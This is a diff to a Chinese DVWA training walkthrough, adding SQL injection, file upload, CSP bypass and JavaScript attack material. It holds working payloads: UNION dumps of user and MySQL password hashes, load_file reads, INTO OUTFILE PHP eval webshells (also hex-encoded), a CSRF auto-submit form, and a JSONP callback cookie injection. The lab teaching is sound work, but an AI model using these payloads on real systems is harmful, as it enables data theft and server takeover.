@@ -1,7 +1,7 @@
 # [dvwa](http://www.dvwa.co.uk/)
 
 ## 前言
-工具一下，exp 一连，shell 就有了，这谁都能学会，但在自己挖洞的过程中，基础的东西就很重要了，我觉得 dvwa 靶机的真正价值是带新人入门，将 web 各个方面都接触一些，这样有了开始，之后就有方向了。
+工具一下，exp 一连，shell 就有了，这谁都能学会，但在自己挖洞的过程中，基础的东西就很重要了，我觉得 dvwa 靶机的真正价值是带新人入门，将 web 各个方面都接触一些，这样有了开始，有了一个接触，之后就有方向了。
 
 ---
 
@@ -24,11 +24,16 @@
 - [新手指南：DVWA-1.9全级别教程之Insecure CAPTCHA](https://www.freebuf.com/articles/web/119692.html)
 - [新手指南：DVWA-1.9全级别教程之SQL Injection](https://www.freebuf.com/articles/web/120747.html)
 - [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](https://www.freebuf.com/articles/web/120985.html)
+- [新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS](https://www.freebuf.com/articles/web/123779.html)
+- [DVWA 黑客攻防演练（十三）JS 攻击 JavaScript Attacks](https://www.cnblogs.com/jojo-feed/p/10206443.html)
+- [DVWA 黑客攻防实战（十五） 绕过内容安全策略 Content Security Policy (CSP) Bypass](ttps://www.cnblogs.com/jojo-feed/p/10204588.html)
+- [2019-3-16 dvwa学习(16)--JavaScript Attacks JS攻击](https://blog.csdn.net/weixin_42555985/article/details/88641118)
 - [DVWA Weak Session IDs 通关教程](http://www.storysec.com/dvwa-weak-session-ids.html)
 - [DVWA XSS (DOM) 通关教程](http://www.storysec.com/dvwa-xss-dom.html)
-
-
-
+- [DVWA SQL Injection 通关教程](http://www.storysec.com/dvwa-sql-injection.html)
+- [DVWA File Inclusion 通关教程](http://www.storysec.com/dvwa-file-inclusion.html)
+- [DVWA Command Injection 通关教程](http://www.storysec.com/dvwa-command-injection.html)
+- [DVWA File Upload 通关教程](http://www.storysec.com/dvwa-file-upload.html)
 
 ---
 
@@ -466,7 +471,15 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 **相关函数介绍**
 - **stristr(string,search,before_search)**
 
-	stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。
+	stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。详细如下：
+	```
+	string	必需。规定被搜索的字符串。
+	search	必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。
+	before_search	可选。默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。
+	返回值：返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。
+	在 PHP 5.3 中，新增了 before_search 参数。
+	在 PHP 4.3 中，该函数变成是二进制安全的。
+	```
 
 - **php_uname(mode)**
 
@@ -653,7 +666,7 @@ generateSessionToken();
 	可以看到，Impossible 级别的代码加入了 Anti-CSRF token，同时对参数 ip 进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。
 
 ## CSRF
-CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。
+CSRF，全称 Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF 与 XSS 最大的区别就在于，CSRF 并没有盗取 cookie 而是直接利用。在 2013 年发布的新版 OWASP Top 10 中，CSRF 排名第 8。
 
 ### Low
 **服务器端核心代码**
@@ -1063,6 +1076,8 @@ if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
 ```
 可以看到，High 级别的代码使用了 fnmatch 函数检查 page 参数，要求 page 参数的开头必须是 file，服务器才会去包含相应的文件。
 
+注：fnmatch 函数适用于 PHP >= 4.3.0，因此 php 版本高于这个才能利用，否则会出现打不开 high 等级页面。
+
 **漏洞利用**
 High 级别的代码规定只能包含 file 开头的文件，看似安全，不幸的是我们依然可以利用 file 协议绕过防护策略。file 协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是 file 协议。
 
@@ -1097,6 +1112,39 @@ if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $f
 ## File Upload
 File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的 webshell 权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx 等都曝出过文件上传漏洞。
 
+先看常规的文件上传操作
+
+**客户端上传**
+
+在HTML `<form>` 标签中 enctype 属性规定在发送到服务器之前应该如何对表单数据进行编码。它的值有三种：
+```
+application/x-www-form-urlencoded: 在发送前编码所有字符（默认）
+
+multipart/form-data: 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。
+
+text/plain: 空格转换为 "+" 加号，但不对特殊字符编码。
+```
+
+**服务端接收**
+
+使用 `$_FILES` 数组接收参数。
+打印 $_FILES `print_r($_FILES);` 发现上传一个文件时的属性有
+```
+[name] => feng.jpeg     文件的名称
+[type] => image/jpeg 	文件的MIME类型
+[tmp_name] => C:\Users\Administrator\AppData\Local\Temp\php2007.tmp  文件的临时位置
+[error] => 0       文件的错误信息  0 ok      1234 error
+[size] => 2859    文件的大小
+```
+
+文件上传漏洞的利用的条件
+```
+1. 能够成功上传木马文件
+2. 上传文件必须能够被执行
+3. 上传文件的路径必须可知
+```
+
+
 ### Low
 **服务器端核心代码**
 ```php
@@ -1124,6 +1172,12 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 - **basename(path,suffix)**
 
     函数返回路径中的文件名部分，如果可选参数 suffix 为空，则返回的文件名包含后缀名，反之不包含后缀名。
+
+	参数介绍：
+
+	$path: 必需。规定要检查的路径。在 Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。
+
+	$suffix: 可选。规定文件扩展名。如果文件有 suffix，则不会输出这个扩展名。
 
 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。
 
@@ -1275,14 +1329,31 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
     函数返回字符串 find 在另一字符串 string 中最后一次出现的位置，如果没有找到字符串则返回 false，可选参数 start 规定在何处开始搜索。
 
+- **strtolower(string)**
+
+	把字符串转换为小写。
+
 - **getimagesize(string filename)**
 
     函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。
 
-可以看到，High 级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是 ”*.jpg”、”*.jpeg” 、”*.png” 之一。同时，getimagesize 函数更是限制了上传文件的文件头必须为图像类型。
+可以看到，High 级别的代码读取文件名中最后一个 `.` 后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是 `*.jpg`、`*.jpeg` 、`*.png` 之一。同时，getimagesize 函数更是限制了上传文件的文件头必须为图像类型。
 
 漏洞利用
 采用 %00 截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，这里只演示如何借助 High 级别的文件包含漏洞来完成攻击。
+
+科普下文件头相关的知识,常见的图片格式的文件头标识如下：
+```
+JPEG/JPG - 文件头标识 (2 bytes): FF D8 (SOI) (JPEG 文件标识) - 文件结束标识 (2 bytes): FF D9 (EOI)
+
+PNG - 文件头标识 (8 bytes)   89 50 4E 47 0D 0A 1A 0A
+
+GIF - 文件头标识 (6 bytes)   47 49 46 38 39(37) 61 |GIF89(7)a
+```
+
+更多格式的文件头标识参见文章: [通过文件头标识判断图片格式](https://www.cnblogs.com/Wendy_Yu/archive/2011/12/27/2303118.html)
+
+文件头欺骗：伪造文件头，使文件头标识一样，其它部分我们修改为一句话木马，也就成了我们常说的图片一句话。
 
 首先利用 copy 将一句话木马文件 php.php 与图片文件 1.jpg 合并
 
@@ -1295,7 +1366,6 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 ![image](../../../img/渗透/实验/dvwa35.png)
 
 注：我在 win10 裸机上进行的 phpstury 环境搭建，在这一步上传过程中，一直失败，后来发现是 windows defender 把上传上来的图片马杀掉了，所以出现同类问题可以检查下杀软情况
-
 
 antSword 连接：
 
@@ -1821,6 +1891,24 @@ generateSessionToken();
 ## SQL Injection
 SQL Injection，即 SQL 注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意 SQL 语句的目的。SQL 注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL 注入仍是现在最常见的Web漏洞之一。
 
+按SQLMap中的分类来看，SQL注入类型有以下5种：
+```
+UNION query SQL injection（可联合查询注入）
+Stacked queries SQL injection（可多语句查询注入）
+Boolean-based blind SQL injection（布尔型注入）
+Error-based SQL injection（报错型注入）
+Time-based blind SQL injection（基于时间延迟注入）
+```
+
+**SQL 注入常规利用思路**
+```
+1. 寻找注入点，可以通过 web 扫描工具实现
+2. 通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。
+3. 猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）
+4. 可以通过获得的用户信息，寻找后台登录。
+5. 利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。
+```
+
 **手工注入思路**
 
 自动化的注入神器 sqlmap 固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。
@@ -1831,7 +1919,7 @@ SQL Injection，即 SQL 注入，是指攻击者通过注入恶意的SQL命令�
 4.获取当前数据库
 5.获取数据库中的表
 6.获取表中的字段名
-7.下载数据
+7.获取数据
 ```
 
 ### Low
@@ -1862,7 +1950,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 ?>
 ```
-可以看到，Low 级别的代码对来自客户端的参数 id 没有进行任何的检查与过滤，存在明显的 SQL 注入。
+由代码可知，通过 REQUEST 方式接受传递的参数 id，再通过 sql 语句带入查询，对来自客户端的参数 id 没有进行任何的检查与过滤，存在明显的 SQL 注入。
 
 **漏洞利用**
 1. 判断是否存在注入，注入是字符型还是数字型
@@ -1909,9 +1997,12 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' union select 1,database() #`，查询成功：
 
+	利用另一种方式 `1' union select user(),database() #`
+
     ![image](../../../img/渗透/实验/dvwa48.png)
 
     说明当前的数据库为 dvwa。
+	union 查询结合了两个 select 查询结果，根据上面的 order by 语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用 union 查询结合我们构造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同。
 
 5. 获取数据库中的表
 
@@ -1929,13 +2020,73 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     说明 users 表中有8个字段，分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
 
-7. 下载数据
+7. 获取数据
 
-    输入`1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`，查询成功：
+    输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`，查询成功：
+
+	或 `1' union select null,concat_ws(char(32,58,32),user,password) from users #`
+
+	或 `1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #`
 
     ![image](../../../img/渗透/实验/dvwa51.png)
 
     这样就得到了 users 表中所有用户的 user_id,first_name,last_name,password 的数据。
+
+8. 猜 root 用户
+
+	输入 `1' union select 1,group_concat(user,password) from mysql.user#`
+
+	得到 root 用户信息：
+
+	![image](../../../img/渗透/实验/dvwa76.png)
+
+9. 读文件和写入拿 webshell
+
+	使用 mysql 的读写功能需要具有一定的权限。
+
+	secure_file_priv 参数用来限制 load_file,into outfile 等相关读写执行函数作用于哪个指定目录。
+	```
+	当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出
+	当 secure_file_priv 的值为/tmp/ ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下
+	当 secure_file_priv 的值为/，表示限制 mysqld 的导入|导出的目录为所在的整个磁盘
+	当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制
+	```
+
+	通过命令查看 secure-file-priv 的当前值 `show global variables like '%secure%';`
+
+	![image](../../../img/渗透/实验/dvwa77.png)
+
+	由于我使用的是 PHPStudy 搭建的环境，MySQL 没有设置过 secure_file_priv 时，默认为 NULL
+
+	修改secure_file_priv为指定的目录：
+
+	Windows下的配置文件：`../MySQL/my.ini`
+
+	Linux下的配置文件：`/etc/mysql/my.cnf` (不同linux下的my.cnf位置路径不同，此处不一一列举)
+
+	在[mysqld]内加入 `secure_file_priv = ` 注意这里为空，表示可以导入导出到任意目录,重启 mysql 服务
+
+	- **`load_file()` 函数读取任意文件**
+
+		`1' union select 1,load_file('C:\\phpStudy\\PHPTutorial\\WWW\\dvwa\\index.php')#`
+
+		![image](../../../img/渗透/实验/dvwa78.png)
+
+	- **利用 `into outfile()` 函数写入一句话拿 webshell**
+
+		不知道路径的情况下，先通过报错得出网站的绝对路径：`1' union select 'xx',2 into outfile 'xx'#`
+
+		![image](../../../img/渗透/实验/dvwa79.png)
+
+		得到路径`C:\phpStudy\PHPTutorial\WWW\dvwa\vulnerabilities\sqli\source\low.php `
+
+		直接 `into outfile` 一句话到根目录 `1' union select 1,'<?php @eval($_POST["cmd"]);?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
+
+		由于单引号会引起闭合而导致查询失败，注意一句话中的 cmd 不能是单引号,或者整句使用双引号 `1' union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
+
+		或者采用编码方式，如十六进制编码的方式 `1' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
+
+		![image](../../../img/渗透/实验/dvwa80.png)
 
 ### Medium
 **服务器端核心代码**
@@ -2026,7 +2177,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
     说明 users 表中有 8 个字段，分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
 
-7. 下载数据
+7. 获取数据
 
     抓包修改参数 id 为 `1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`
 
@@ -2062,7 +2213,7 @@ if( isset( $_SESSION [ 'id' ] ) ) {
 
 **漏洞利用**
 
-虽然添加了 LIMIT 1，但是我们可以通过 `#` 将其注释掉。由于手工注入的过程与 Low 级别基本一样，直接最后一步演示下载数据。
+虽然添加了 LIMIT 1，但是我们可以通过 `#` 将其注释掉。由于手工注入的过程与 Low 级别基本一样，直接最后一步演示获取数据。
 
 输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #` ，查询成功：
 
@@ -2736,10 +2887,8 @@ stripos() 函数查找字符串在另一字符串中第一次出现的位置
 **服务器端核心代码**
 ```php
 <?php
-
 // Is there any input?
-if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
-
+if (array_key_exists("default", $_GET) && !is_null($_GET['default'])) {
     # White list the allowable languages
     switch ($_GET['default']) {
         case "French":
@@ -2749,12 +2898,10 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
             # ok
             break;
         default:
-            header ("location: ?default=English");
+            header("location: ?default=English");
             exit;
     }
 }
-
-?>
 ```
 
 这里采用了白名单，然而并没有什么鸟用
@@ -2780,16 +2927,12 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
 **服务器端核心代码**
 ```php
 <?php
-
-header ("X-XSS-Protection: 0");
-
+header("X-XSS-Protection: 0");
 // Is there any input?
-if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
     // Feedback for end user
-    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+    echo '<pre>Hello ' . $_GET['name'] . '</pre>';
 }
-
-?>
 ```
 
 可以看到，代码直接引用了 name 参数，并没有任何的过滤与检查，存在明显的 XSS 漏洞。
@@ -2806,54 +2949,44 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 **服务器端核心代码**
 ```php
 <?php
-
-header ("X-XSS-Protection: 0");
-
+header("X-XSS-Protection: 0");
 // Is there any input?
-if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
     // Get input
-    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
-
+    $name = str_replace('<script>', '', $_GET['name']);
     // Feedback for end user
-    echo "<pre>Hello ${name}</pre>";
+    echo "<pre>Hello {$name}</pre>";
 }
-
-?>
 ```
-可以看到，这里对输入进行了过滤，基于黑名单的思想，使用 str_replace 函数将输入中的 <script> 删除，这种防护机制是可以被轻松绕过的。
+可以看到，这里对输入进行了过滤，基于黑名单的思想，使用 str_replace 函数将输入中的 `<script>` 删除，这种防护机制是可以被轻松绕过的。
 
 **漏洞利用**
 1. 双写绕过
 
 输入`<sc<script>ript>alert(/xss/)</script>`，成功弹框：
 
-相应的XSS链接：
+相应的 XSS 链接：
 `http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
 
 2. 大小写混淆绕过
 
 输入`<ScRipt>alert(/xss/)</script>`，成功弹框：
 
-相应的XSS链接：
+相应的 XSS 链接：
 `http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
 
 #### High
 **服务器端核心代码**
 ```php
 <?php
-
-header ("X-XSS-Protection: 0");
-
+header("X-XSS-Protection: 0");
 // Is there any input?
-if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
     // Get input
-    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
-
+    $name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name']);
     // Feedback for end user
-    echo "<pre>Hello ${name}</pre>";
+    echo "<pre>Hello {$name}</pre>";
 }
-
-?>
 ```
 可以看到，High 级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中 i 表示不区分大小写）不再有效。
 
@@ -2867,23 +3000,17 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 **服务器端核心代码**
 ```php
 <?php
-
 // Is there any input?
-if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
     // Check Anti-CSRF token
-    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
-
+    checkToken($_REQUEST['user_token'], $_SESSION['session_token'], 'index.php');
     // Get input
-    $name = htmlspecialchars( $_GET[ 'name' ] );
-
+    $name = htmlspecialchars($_GET['name']);
     // Feedback for end user
-    echo "<pre>Hello ${name}</pre>";
+    echo "<pre>Hello {$name}</pre>";
 }
-
 // Generate Anti-CSRF token
 generateSessionToken();
-
-?>
 ```
 可以看到，Impossible 级别的代码使用 htmlspecialchars 函数把预定义的字符 &、"、 '、<、> 转换为 HTML 实体，防止浏览器将其作为 HTML 元素。
 
@@ -2965,7 +3092,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 
 **相关函数介绍**
 
-strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <b> 标签。
+strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 `<b>` 标签。
 
 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。
 
@@ -3054,34 +3181,413 @@ generateSessionToken();
 
 可以看到，通过使用 htmlspecialchars 函数，解决了 XSS，但是要注意的是，如果 htmlspecialchars 函数使用不当，攻击者就可以通过编码的方式绕过函数进行 XSS 注入，尤其是 DOM 型的 XSS。
 
+---
 
+## CSP Bypass
 
+CSP 就是浏览器的安全策略，如果标签，或者是服务器中返回 HTTP 头中有 Content-Security-Policy 标签 ，浏览器会根据标签里面的内容，判断哪些资源可以加载或执行。
 
-https://www.freebuf.com/articles/web/123779.html
+CSP 相关教程：https://www.ruanyifeng.com/blog/2016/09/csp.html
 
+DVWA 中需求也是很简单的，输入被信任的资源，就能加载或执行资源了。
+
+### Low
+**服务器端核心代码**
+```php
+<?php
+$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;";
+// allows js from self, pastebin.com, jquery and google analytics.
+header($headerCSP);
+# https://pastebin.com/raw/R570EE00
+if (isset($_POST['include'])) {
+    $page['body'] .= "\r\n    <script src='" . $_POST['include'] . "'></script>\r\n";
+}
+$page['body'] .= '
+<form name="csp" method="POST">
+    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
+    <input size="50" type="text" name="include" value="" id="include" />
+    <input type="submit" value="Include" />
+</form>
+';
+```
+
+如果不看源码的话。看检查器（F12），也可以知道一些被信任的网站。
+
+![image](../../../img/渗透/实验/dvwa66.png)
+
+当中的 pastebin 是什么网站呢？一个快速分享文本内容的网站,假如文本的内容是一段 js 代码呢？
+
+源码中提示我们的， 输入 https://pastebin.com/raw/VqHmJKjr
+其内容是 `alert(document.cookie)`
+
+![image](../../../img/渗透/实验/dvwa67.png)
+
+那么能如何进行攻击呢? 可以用 CSRF
+```html
+<form action="http://<IP地址!!!>
+	/dvwa/vulnerabilities/csp/" id="csp" method="post">
+	<input type="text" name="include" value=""/>
+</form>
+<script>
+var form = document.getElementById("csp");
+form[0].value="https://pastebin.com/raw/VqHmJKjr";
+form.submit();
+</script>
+```
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
+header($headerCSP);
+// Disable XSS protections so that inline alert boxes will work
+header("X-XSS-Protection: 0");
+# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
+if (isset($_POST['include'])) {
+    $page['body'] .= "\r\n    " . $_POST['include'] . "\r\n";
+}
+$page['body'] .= '
+<form name="csp" method="POST">
+    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
+    <input size="50" type="text" name="include" value="" id="include" />
+    <input type="submit" value="Include" />
+</form>
+';
+```
+
+![image](../../../img/渗透/实验/dvwa68.png)
+
+中级的问题在于使用了 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=' 这个标签，
+
+也就是说如果你输入
+`<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>` 是能注入成功的。
+
+### High
+**服务器端核心代码**
+```php
+<?php
+$headerCSP = "Content-Security-Policy: script-src 'self';";
+header($headerCSP);
+if (isset($_POST['include'])) {
+    $page['body'] .= "\r\n    " . $_POST['include'] . "\r\n";
+}
+$page['body'] .= '
+<form name="csp" method="POST">
+    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
+    <p>1+2+3+4+5=<span id="answer"></span></p>
+    <input type="button" id="solve" value="Solve the sum" />
+</form>
+
+<script src="source/high.js"></script>
+';
+```
+
+高级就改变了形式了，点击按钮会得到答案，而这个答案是用 JSONP 的方式获得的。（常用于跨越请求）而且 cps 也设置为只信任自己的域名了 `Content-Security-Policy: script-src 'self';`
+
+点击后发请求的逻辑在 vulnerabilities/csp/source/high.js 中
+```js
+function clickButton() {
+    var s = document.createElement("script");
+    s.src = "source/jsonp.php?callback=solveSum";
+    document.body.appendChild(s);
+}
+
+function solveSum(obj) {
+    if ("answer" in obj) {
+        document.getElementById("answer").innerHTML = obj['answer'];
+    }
+}
+
+var solve_button = document.getElementById ("solve");
+
+if (solve_button) {
+    solve_button.addEventListener("click", function() {
+        clickButton();
+    });
+}
+```
+先说下这里的逻辑是什么吧。
+1. 客户端点击按钮后，会在 html 中创建 `<script src="<IP地址!!!>/vulnerabilities/csp/source/jsonp.php?callback=solveSum"></script>` 这样的标签
+2. 因为 script 不同于 ajax，所以可以跨域发送的
+3. 服务器就根据 callback 请求，返回 solveSum({"answer":"15"}) , 就可以调用 high.js 中的 solveSum 。
+
+![image](../../../img/渗透/实验/dvwa69.png)
+
+但如果有人将 callback 参数改成 `callback=alert(document.cookie)` 呢？
+返回的会是 `alert(document.cookie)//({"answer":"15"}) `。。。
+所以这是一个注入点
+
+![image](../../../img/渗透/实验/dvwa70.png)
+
+![image](../../../img/渗透/实验/dvwa71.png)
+
+### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+$headerCSP = "Content-Security-Policy: script-src 'self';";
+
+header($headerCSP);
+
+?>
+<?php
+if (isset ($_POST['include'])) {
+$page[ 'body' ] .= "
+    " . $_POST['include'] . "
+";
+}
+$page[ 'body' ] .= '
+<form name="csp" method="POST">
+    <p>Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.</p><p>The CSP settings only allow external JavaScript on the local server and no inline code.</p>
+    <p>1+2+3+4+5=<span id="answer"></span></p>
+    <input type="button" id="solve" value="Solve the sum" />
+</form>
+
+<script src="source/impossible.js"></script>
+';
+
+```
+就没有 url 中的 callback 了，后台写死了
 
 ---
 
-http://www.storysec.com/dvwa-file-upload.html
+## JavaScript Attacks
+提交“success”一词来获胜。不是，这打 CTF 呢？
 
-http://www.storysec.com/dvwa-sql-injection.html
+<p align="center">
+    <img src="../../../img/渗透/实验/dvwa72.png">
+</p>
 
-https://blog.csdn.net/hitwangpeng/article/details/47042971
+### Low
+**服务器端核心代码**
+```php
+<?php
+$page[ 'body' ] .= <<<EOF
+<script>
 
-https://blog.csdn.net/nzjdsds/article/details/81814066
+/*
+MD5 code from here
+https://github.com/blueimp/JavaScript-MD5
+*/
 
+!function(n) {
+ "use strict";
 
+ function t(n, t) {
+  var r = (65535 & n) + (65535 & t);
+  return (n >> 16) + (t >> 16) + (r >> 16) << 16 | 65535 & r
+ }
 
+ function r(n, t) {
+  return n << t | n >>> 32 - t
+ }
 
-http://www.storysec.com/dvwa-sql-injection.html
+ function e(n, e, o, u, c, f) {
+  return t(r(t(t(e, n), t(u, f)), c), o)
+ }
 
+ function o(n, t, r, o, u, c, f) {
+  return e(t & r | ~t & o, n, t, u, c, f)
+ }
 
+ function u(n, t, r, o, u, c, f) {
+  return e(t & o | r & ~o, n, t, u, c, f)
+ }
 
+ function c(n, t, r, o, u, c, f) {
+  return e(t ^ r ^ o, n, t, u, c, f)
+ }
 
+ function f(n, t, r, o, u, c, f) {
+  return e(r ^ (t | ~o), n, t, u, c, f)
+ }
 
+ function i(n, r) {
+  n[r >> 5] |= 128 << r % 32, n[14 + (r + 64 >>> 9 << 4)] = r;
+  var e, i, a, d, h, l = 1732584193,
+   g = -271733879,
+   v = -1732584194,
+   m = 271733878;
+  for (e = 0; e < n.length; e += 16) i = l, a = g, d = v, h = m, g = f(g = f(g = f(g = f(g = c(g = c(g = c(g = c(g = u(g = u(g = u(g = u(g = o(g = o(g = o(g = o(g, v = o(v, m = o(m, l = o(l, g, v, m, n[e], 7, -680876936), g, v, n[e + 1], 12, -389564586), l, g, n[e + 2], 17, 606105819), m, l, n[e + 3], 22, -1044525330), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 4], 7, -176418897), g, v, n[e + 5], 12, 1200080426), l, g, n[e + 6], 17, -1473231341), m, l, n[e + 7], 22, -45705983), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 8], 7, 1770035416), g, v, n[e + 9], 12, -1958414417), l, g, n[e + 10], 17, -42063), m, l, n[e + 11], 22, -1990404162), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 12], 7, 1804603682), g, v, n[e + 13], 12, -40341101), l, g, n[e + 14], 17, -1502002290), m, l, n[e + 15], 22, 1236535329), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 1], 5, -165796510), g, v, n[e + 6], 9, -1069501632), l, g, n[e + 11], 14, 643717713), m, l, n[e], 20, -373897302), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 5], 5, -701558691), g, v, n[e + 10], 9, 38016083), l, g, n[e + 15], 14, -660478335), m, l, n[e + 4], 20, -405537848), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 9], 5, 568446438), g, v, n[e + 14], 9, -1019803690), l, g, n[e + 3], 14, -187363961), m, l, n[e + 8], 20, 